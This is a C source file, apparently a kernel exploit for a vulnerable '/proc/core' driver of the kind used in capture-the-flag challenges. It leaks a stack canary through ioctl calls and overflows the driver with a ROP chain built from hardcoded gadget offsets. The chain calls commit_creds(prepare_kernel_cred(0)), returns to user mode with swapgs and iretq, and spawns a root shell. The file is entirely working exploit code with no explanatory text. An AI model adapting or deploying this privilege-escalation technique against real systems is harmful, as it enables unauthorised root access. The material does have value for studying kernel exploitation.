#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>

unsigned long user_cs,user_ss,user_rsp,user_flag;
unsigned long prepare_kernel_cred,commit_cred;

void save_state(){
    __asm__(
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_rsp,rsp;"
        "pushf;"
        "pop user_flag;"
    );
    puts("[*]Save the state!");
}

void getshell(){
    system("/bin/sh");
}

void getroot(){
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_cred;
    (*cc)((*pkc)(0));
}

int main(){

    save_state();

    int fd = open("/proc/core",2);

    printf("input the prepare_addr:");
    scanf("%px",&prepare_kernel_cred);
    printf("input the commit_addr:");
    scanf("%px",&commit_cred);

    unsigned long offset_addr = prepare_kernel_cred - 0xffffffff8109cce0;

    unsigned long *copy_leak = malloc(0x20);

    ioctl(fd,1719109788,0x40);
    ioctl(fd,1719109787,copy_leak);

    unsigned long canary_ = *copy_leak;

    unsigned long rop[20] = {
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        0x9090909090909090,
        canary_,
        0x9090909090909090,
        getroot,
        0xffffffff81a012da+offset_addr, // swapgs; popfq; ret
        0,
        0xffffffff81050ac2+offset_addr, // iretq; ret;
        getshell,
        user_cs,
        user_flag,
        user_rsp,
        user_ss
    };

    write(fd,rop,0x200);

    ioctl(fd,1719109786,0xffffffff000000f0);

    return 0;
}
